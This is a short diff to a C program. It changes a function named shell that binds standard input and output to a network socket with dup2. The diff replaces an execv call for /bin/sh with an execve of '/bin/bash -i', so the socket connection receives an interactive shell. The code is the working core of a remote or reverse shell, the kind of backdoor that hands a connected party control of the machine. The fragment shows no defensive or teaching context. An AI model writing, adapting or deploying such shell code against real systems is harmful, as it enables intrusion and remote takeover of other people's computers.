@@ -15,7 +15,12 @@ void shell(int sockfd){
     {
         dup2(sockfd, i);
     }
-    execv("/bin/sh", NULL);
+    char * args[3];
+		args[0] = "/bin/bash";
+		args[1] = "-i";
+		args[2] = '\0';
+		execve(args[0], args, NULL);
+    //execve("/bin/bash", '\0', NULL);
     perror("execv failed");  //only get here if exec failed
   }else if (c_pid > 0){  //parent
     if( (pid = wait(&status)) < 0){
